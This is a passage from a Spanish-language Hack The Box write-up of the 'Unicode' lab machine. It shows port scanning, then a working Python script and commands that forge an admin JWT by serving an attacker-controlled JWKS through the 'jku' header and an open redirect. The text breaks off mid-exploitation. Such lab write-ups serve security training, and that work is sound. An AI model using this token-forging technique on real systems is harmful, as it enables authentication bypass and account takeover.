<!doctype html><html lang=es><head><title>Unicode | 7Rocky</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="Hack The Box. Linux. Máquina media. Esta máquina utiliza tokens JWT con JWKS y JKU que pueden ser falsificados para llegar a una vulnerabilidad de navegación de directorios que puede ser explotada mediante caracteres Unicode. Después, existe un binario compilado con Python que puede ejecutarse con sudo y usa curl por detrás. Para comprometer esta máquina se necesitan conocimientos sobre JWT y técnicas de bypassing para navegación de directorios e inyección de comandos. En este write-up se utiliza un script en Python para explotar la navegación de directorios usando JWT y JWKS"><meta itemprop=description content="Hack The Box. Linux. Máquina media. Esta máquina utiliza tokens JWT con JWKS y JKU que pueden ser falsificados para llegar a una vulnerabilidad de navegación de directorios que puede ser explotada mediante caracteres Unicode. Después, existe un binario compilado con Python que puede ejecutarse con sudo y usa curl por detrás. Para comprometer esta máquina se necesitan conocimientos sobre JWT y técnicas de bypassing para navegación de directorios e inyección de comandos. En este write-up se utiliza un script en Python para explotar la navegación de directorios usando JWT y JWKS"><meta name=twitter:description content="Hack The Box. Linux. Máquina media. Esta máquina utiliza tokens JWT con JWKS y JKU que pueden ser falsificados para llegar a una vulnerabilidad de navegación de directorios que puede ser explotada mediante caracteres Unicode. Después, existe un binario compilado con Python que puede ejecutarse con sudo y usa curl por detrás. Para comprometer esta máquina se necesitan conocimientos sobre JWT y técnicas de bypassing para navegación de directorios e inyección de comandos. En este write-up se utiliza un script en Python para explotar la navegación de directorios usando JWT y JWKS"><meta property="og:description" content="Hack The Box. Linux. Máquina media. Esta máquina utiliza tokens JWT con JWKS y JKU que pueden ser falsificados para llegar a una vulnerabilidad de navegación de directorios que puede ser explotada mediante caracteres Unicode. Después, existe un binario compilado con Python que puede ejecutarse con sudo y usa curl por detrás. Para comprometer esta máquina se necesitan conocimientos sobre JWT y técnicas de bypassing para navegación de directorios e inyección de comandos. En este write-up se utiliza un script en Python para explotar la navegación de directorios usando JWT y JWKS"><meta name=robots content="index, follow"><meta name=author content="7Rocky"><meta name=twitter:author content="7Rocky"><meta property="og:author" content="7Rocky"><meta name=image content="https://7rocky.github.io/images/HTB/Unicode/Unicode.png"><meta name=twitter:image content="https://7rocky.github.io/images/HTB/Unicode/Unicode.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Unicode/Unicode.png"><meta property="og:site_name" content="7Rocky"><meta itemprop=name content="Unicode"><meta property="og:title" content="Unicode"><meta property="og:url" content="https://7rocky.github.io/htb/unicode/"><meta itemprop=keywords content="sudo,flask,nginx,python,open-redirect,jwt,reversing,command-injection,directory-path-traversal,static-code-analysis,password-reuse,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon><link href=/css/style.css rel=stylesheet><link href=/css/main.css rel=stylesheet><link href=/css/monokai-sublime.min.css rel=stylesheet><link href=/css/code.css rel=stylesheet><script src=/js/highlight.min.js></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src=/js/htb.js></script></head><body class="ma0 production"><header style=position:sticky;top:0;z-index:9><div class=bg-black><nav class=ph4-ns role=navigation><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href=/ title=7Rocky>7Rocky</a><div class="flex-l items-center"><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href title=es><img alt=es height=30px src=/images/es.png width=30px></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href=/en/htb/unicode/ title=en><img alt=en height=30px src=/images/en.png style="border:4px solid#000;border-radius:100%" width=30px></a><ul class="pl0 ml3 mr3" style=line-height:30px><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/ctf/ title=CTF>CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/htb/ title=HTB>HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/imc/ title=IMC>IMC</a></li></ul><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class=pb7 role=main><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><aside aria-label=aside class="instapaper_ignoref b helvetica tracked">HTB</aside><div id=sharing class=mt3><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/unicode/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/unicode/&text=Unicode" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/unicode/&title=Unicode" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Unicode</h1><time class="f6 mv4 dib tracked" datetime=2022-05-07T00:00:00+01:00>07 / 05 / 2022</time></header><div class=htb-image><img alt=Unicode src=/images/HTB/Unicode/Unicode.png></div><ul class="nested-links tags"><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/sudo title=sudo>sudo</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/flask title=Flask>Flask</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/nginx title=nginx>nginx</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/python title=Python>Python</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/open-redirect title="Open Redirect">Open Redirect</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/jwt title="JSON Web Token">JSON Web Token</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/reversing title="Ingeniería inversa">Ingeniería inversa</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/command-injection title="Inyección de Comandos">Inyección de Comandos</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/directory-path-traversal title="Navegación de directorios">Navegación de directorios</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/static-code-analysis title="Análisis de Código Estático">Análisis de Código Estático</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/password-reuse title="Reutilización de contraseñas">Reutilización de contraseñas</a></li></ul><aside aria-label=aside class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem><p class="f5 b mb3">Contenidos de este write-up</p><nav id=TableOfContents><ul><li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#enumeración-web>Enumeración web</a></li><li><a href=#falsificando-un-_token_-jwt>Falsificando un <em>token</em> JWT</a></li><li><a href=#explotación-de-_directory-path-traversal_>Explotación de <em>Directory Path Traversal</em></a></li><li><a href=#enumeración-del-sistema>Enumeración del sistema</a></li><li><a href=#ingeniería-inversa-sobre-treport>Ingeniería inversa sobre <code>treport</code></a></li><li><a href=#escalada-de-privilegios-con-sudo>Escalada de privilegios con <code>sudo</code></a></li></ul></nav></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Media</li><li><strong>Dirección IP</strong>: 10.10.11.126</li><li><strong>Fecha</strong>: 27 / 11 / 2021</li></ul><h2 id=escaneo-de-puertos>Escaneo de puertos</h2><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.126 -p 22,80
Nmap scan report for 10.10.11.126
Host is up (0.057s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 (RSA)
|   256 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 (ECDSA)
|_  256 c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: 503
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done -- 1 IP address (1 host up) scanned in 10.27 seconds
</code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).</p><h2 id=enumeración-web>Enumeración web</h2><p>Si vamos a <code>http://10.10.11.126</code> veremos una página como esta:</p><p><img src=/images/HTB/Unicode/Unicode-index.png alt="Unicode index"></p><p>Vemos que hay una funcionalidad de redirección (el botón que dice &ldquo;<em>Google about us</em>&rdquo;):</p><p><img src=/images/HTB/Unicode/Unicode-redirect.png alt="Unicode redirect"></p><p>También podemos registrar una nueva cuenta en <code>/register/</code>:</p><p><img src=/images/HTB/Unicode/Unicode-register.png alt="Unicode register"></p><p>Luego, podemos iniciar sesión en <code>/login/</code> y acceder a nuestro <em>dashboard</em> en <code>/dashboard/</code>:</p><p><img src=/images/HTB/Unicode/Unicode-dashboard.png alt="Unicode dashboard"></p><p>Si tratamos de registrar una cuenta como <code>admin</code>, veremos que este usuario ya existe:</p><p><img src=/images/HTB/Unicode/Unicode-admin-exists.png alt="Unicode admin exists"></p><p>Si examinamos la <em>cookie</em> que pone el servidor, vemos que es un <em>token</em> JWT. El contenido del <em>token</em> se puede mostrar fácilmente en <a href=https://jwt.io>jwt.io</a>:</p><p><img src=/images/HTB/Unicode/Unicode-jwt.png alt="Unicode JWT"></p><p>Aquí vemos una <em>claim</em> JWT rara (esto es, una pareja clave-valor en la sección de la cabecera). La clave <code>jku</code> no es muy común. Vemos que hay un dominio <code>hackmedia.htb</code>, por lo que podemos añadirlo a <code>/etc/hosts</code> apuntando a <code>10.10.11.126</code>.</p><p>Ahora, podemos solicitar <code>http://hackmedia.htb/static/jwks.json</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> -s hackmedia.htb/static/jwks.json | <span class=code-dark-green>jq</span>
{
  <span class=code-blue>"keys"</span>: [
    {
      <span class=code-blue>"kty"</span>: <span class=code-dark-green>"RSA"</span>,
      <span class=code-blue>"use"</span>: <span class=code-dark-green>"sig"</span>,
      <span class=code-blue>"kid"</span>: <span class=code-dark-green>"hackthebox"</span>,
      <span class=code-blue>"alg"</span>: <span class=code-dark-green>"RS256"</span>,
      <span class=code-blue>"n"</span>: <span class=code-dark-green>"AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs"</span>,  
      <span class=code-blue>"e"</span>: <span class=code-dark-green>"AQAB"</span>
    }
  ]
}
</code></pre></div><p>Esto es un JSON Web Key Set (JWKS). Se utiliza para almacenar la clave pública RSA que verifica el <em>token</em> JWT, porque el <em>token</em> fue firmado con la correspondiente clave privada RSA en el momento de su creación.</p><h2 id=falsificando-un-_token_-jwt>Falsificando un <em>token</em> JWT</h2><p>La idea es sencilla, primero, creamos un par de claves RSA pública y privada. Luego, podemos generar un JWKS con la clave pública y exponerla mediante un servidor web. Después, podemos falsificar un <em>token</em> JWT que tenga <code>admin</code> como usuario y un valor de <code>jku</code> que apunte a nuestro JWKS y firmar el <em>token</em> con nuestra clave privada.</p><p>Finalmente, la máquina víctima recibirá el <em>token</em> falso y para verificarlo, el servidor cogerá nuestro JWKS y realizará le verificación de forma correcta.</p><p>Para este propósito, vamos a usar un <em>script</em> en Python como este:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>python3</span>

<span class=mtk5>import</span> <span class="mtk8 mtku">base64</span>
<span class=mtk5>import</span> <span class="mtk8 mtku">json</span>
<span class=mtk5>import</span> <span class="mtk8 mtku">jwt</span>
<span class=mtk5>import</span> <span class="mtk8 mtku">sys</span>

<span class=mtk5>from</span> <span class="mtk8 mtku">Crypto</span><span class=mtk1>.</span><span class="mtk8 mtku">PublicKey</span> <span class=mtk5>import</span> <span class="mtk8 mtku">RSA</span>
<span class=mtk5>from</span> <span class="mtk8 mtku">Crypto</span><span class=mtk1>.</span><span class="mtk8 mtku">Util</span><span class=mtk1>.</span><span class="mtk8 mtku">number</span> <span class=mtk5>import</span> <span class=mtk8>long_to_bytes</span>

<span class=mtk5>from</span> <span class="mtk8 mtku">http</span><span class=mtk1>.</span><span class="mtk8 mtku">server</span> <span class=mtk5>import</span> <span class="mtk8 mtku">HTTPServer</span><span class=mtk1>,</span> <span class="mtk8 mtku">SimpleHTTPRequestHandler</span>

<span class=mtk1>privkey</span> <span class=mtk5>=</span> <span class=mtk8>open</span><span class=mtk1>(</span><span class=mtk4>'priv.key'</span><span class=mtk1>).</span><span class=mtk8>read</span><span class=mtk1>()</span>
<span class=mtk1>pubkey</span> <span class=mtk5>=</span> <span class="mtk8 mtku">RSA</span><span class=mtk1>.</span><span class=mtk8>import_key</span><span class=mtk1>(</span><span class=mtk8>open</span><span class=mtk1>(</span><span class=mtk4>'pub.key'</span><span class=mtk1>).</span><span class=mtk8>read</span><span class=mtk1>())</span>


<span class="mtk7 mtki">def</span> <span class=mtk8>int_to_b64</span><span class=mtk1>(</span><span class="mtk9 mtki">x</span><span class=mtk1>:</span> <span class="mtk8 mtku">str</span> <span class=mtk5>|</span> <span class="mtk8 mtku">int</span><span class=mtk1>)</span> <span class=mtk1>-&gt;</span> <span class="mtk8 mtku">str</span><span class=mtk1>:</span>
    <span class=mtk5>return</span> <span class="mtk8 mtku">base64</span><span class=mtk1>.</span><span class=mtk8>urlsafe_b64encode</span><span class=mtk1>(</span><span class=mtk8>long_to_bytes</span><span class=mtk1>(</span><span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class="mtk9 mtki">x</span><span class=mtk1>))).</span><span class=mtk8>decode</span><span class=mtk1>()</span>  


<span class="mtk7 mtki">def</span> <span class=mtk8>generate_jwks</span><span class=mtk1>():</span>
    <span class="mtk8 mtku">json</span><span class=mtk1>.</span><span class=mtk8>dump</span><span class=mtk1>({</span><span class=mtk4>'keys'</span><span class=mtk1>:</span> <span class=mtk1>[{</span>
        <span class=mtk4>'kty'</span><span class=mtk1>:</span> <span class=mtk4>'RSA'</span><span class=mtk1>,</span>
        <span class=mtk4>'kid'</span><span class=mtk1>:</span> <span class=mtk4>'hackthebox'</span><span class=mtk1>,</span>
        <span class=mtk4>'use'</span><span class=mtk1>:</span> <span class=mtk4>'sig'</span><span class=mtk1>,</span>
        <span class=mtk4>'alg'</span><span class=mtk1>:</span> <span class=mtk4>'RS256'</span><span class=mtk1>,</span>
        <span class=mtk4>'e'</span><span class=mtk1>:</span> <span class=mtk8>int_to_b64</span><span class=mtk1>(</span><span class=mtk1>pubkey</span><span class=mtk1>.</span><span class=mtk1>e</span><span class=mtk1>),</span>
        <span class=mtk4>'n'</span><span class=mtk1>:</span> <span class=mtk8>int_to_b64</span><span class=mtk1>(</span><span class=mtk1>pubkey</span><span class=mtk1>.</span><span class=mtk1>n</span><span class=mtk1>)</span>
    <span class=mtk1>}]},</span> <span class=mtk8>open</span><span class=mtk1>(</span><span class=mtk4>'jwks.json'</span><span class=mtk1>,</span> <span class=mtk4>'w'</span><span class=mtk1>),</span> <span class="mtk9 mtki">indent</span><span class=mtk5>=</span><span class=mtk6>2</span><span class=mtk1>)</span>


<span class="mtk7 mtki">def</span> <span class=mtk8>main</span><span class=mtk1>():</span>
    <span class=mtk8>generate_jwks</span><span class=mtk1>()</span>

    <span class=mtk1>ip</span> <span class=mtk5>=</span> <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>1</span><span class=mtk1>]</span>
    <span class=mtk1>jku</span> <span class=mtk5>=</span> <span class="mtk7 mtki">f</span><span class=mtk4>'</span><span class="mtk4 detected-link">http://</span><span class="mtk6 detected-link">{</span><span class="mtk1 detected-link">ip</span><span class=mtk6>}</span><span class=mtk4>/jwks.json'</span>
    <span class=mtk1>token</span> <span class=mtk5>=</span> <span class="mtk8 mtku">jwt</span><span class=mtk1>.</span><span class=mtk1>encode</span><span class=mtk1>({</span><span class=mtk4>'user'</span><span class=mtk1>:</span> <span class=mtk4>'asdf'</span><span class=mtk1>},</span> <span class=mtk1>privkey</span><span class=mtk1>,</span>
                       <span class="mtk9 mtki">algorithm</span><span class=mtk5>=</span><span class=mtk4>'RS256'</span><span class=mtk1>,</span>
                       <span class="mtk9 mtki">headers</span><span class=mtk5>=</span><span class=mtk1>{</span><span class=mtk4>'jku'</span><span class=mtk1>:</span> <span class=mtk1>jku</span><span class=mtk1>})</span>

    <span class=mtk8>print</span><span class=mtk1>(</span><span class=mtk4>'[+]</span> <span class=mtk4>JWT</span> <span class=mtk4>token:'</span><span class=mtk1>,</span> <span class=mtk1>token</span><span class=mtk1>)</span>

    <span class="mtk8 mtku">HTTPServer</span><span class=mtk1>((</span><span class=mtk4>''</span><span class=mtk1>,</span> <span class=mtk6>80</span><span class=mtk1>),</span> <span class="mtk8 mtku">SimpleHTTPRequestHandler</span><span class=mtk1>).</span><span class=mtk8>serve_forever</span><span class=mtk1>()</span>


<span class=mtk5>if</span> <span class=mtk1>__name__</span> <span class=mtk5>==</span> <span class=mtk4>'__main__'</span><span class=mtk1>:</span>
    <span class=mtk8>main</span><span class=mtk1>()</span>
</code></pre></div><p>Antes de ejecutar el <em>script</em> tenemos que generar las claves RSA. Para ello usamos <code>openssl</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>openssl</span> genrsa -out priv.key 1024
Generating RSA private key, 1024 bit long modulus
.........................................................................................................................++++++  
...++++++
e is 65537 (0x10001)

<span class=code-cyan>$</span> <span class=code-dark-green>openssl</span> rsa -in <span class=mtku>priv.key</span> -pubout &gt; pub.key
writing RSA key
</code></pre></div><p>Para generar el JWKS, tenemos que extraer <code>n</code> y <code>e</code> de la clave pública (esto en Pyhton se hace con <code>Crypto.PublicKey.RSA</code>) y luego codificarlo en Base64. Luego, estos valores junto con otros datos se guardan en un documento JSON llamado <code>jwks.json</code>.</p><p>Entonces, generamos el <em>token</em> JWT falso usando la clave privada y poniendo la URL de <code>jwks.json</code> como <code>jku</code> en la cabecera.</p><p>Si ejecutamos el <em>script</em>, veremos el <em>token</em> JWT y se iniciará un servidor web en el puerto 80 para servir el archivo <code>jwks.json</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>jwks.py</span> 10.10.17.44
[+] JWT token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE3LjQ0L2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.OFeVvgtLOIp2u2Gd-LUrPFsTTCq3LvoDTRW98vZWuy2BfcKz4PuXoCIRKX2Rcbnnb6BDBX3UkL7FPa0XhIcw3Y_ASgEGJQWJdzjPWASwtFj_oTDKIlFz0HhgrvHPTM8Mn_t9D164vrPtHnk_w8rjzX5ZLQ5XnRDra8gusgqXK2s  
</code></pre></div><p>Luego, podemos usar <code>curl</code> para ver si el <em>token</em> JWT es válido:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> hackmedia.htb/dashboard/ -H <span class=code-dark-yellow>'Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly8xMC4xMC4xNy40NC9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.ba9qYIw2E8ynYq1OPnZ4gDoSOtxpFZMivvgr8YqN7AXuPE1kw4mpEwYoNyPvoH3dAcnVRjkzytaQGvtYuYT8oXHZMrlZ3uN0p76e86p5Crr4tyYk1D4o8GT0KpCY6ABlcxChxonLGH5S3GqqnJ2wqrojoeThJ-CDrJFQM2ggSWI'</span>  
jku validation failed
</code></pre></div><p>Y el servidor nos dice que el campo <code>jku</code> es inválido. Además, no recibimos ninguna petición en el registro del servidor Python. La máquina tiene que haber aplicado algún tipo de filtro.</p><p>Aquí podemos recordar que había una funcionalidad de redirección en la página web. Si la máquina solamente admite valores de <code>jku</code> que empiecen por <code>http://hackmedia.htb</code>, entonces esta validación se puede saltar fácilmente con la función de redirección (<em>Open Redirect</em>). Podemos cambiar el campo <code>jku</code> en el <em>script</em> así:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk8>+ jku = f'http://hackmedia.htb/redirect?url={ip}/jwks.json'</span>  
<span class=mtk5>- jku = f'http://{ip}/jwks.json'</span>
</code></pre></div><p>Ejecutamos el <em>script</em> de nuevo:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>jwks.py</span> 10.10.17.44
